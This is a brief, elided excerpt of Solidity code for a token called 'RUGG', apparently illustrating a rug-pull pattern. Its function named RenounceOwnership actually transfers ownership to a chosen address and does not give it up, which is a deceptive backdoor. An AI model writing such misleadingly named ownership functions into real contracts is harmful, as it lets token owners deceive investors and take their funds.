...
abstract contract Auth {
    ...
    function RenounceOwnership(address payable adr) public virtual onlyOwner {
        owner = adr;
...
contract RUGG is IBEP20, Auth {
    ...
    string constant _name = "RUGG";
    string constant _symbol = "RUGG";
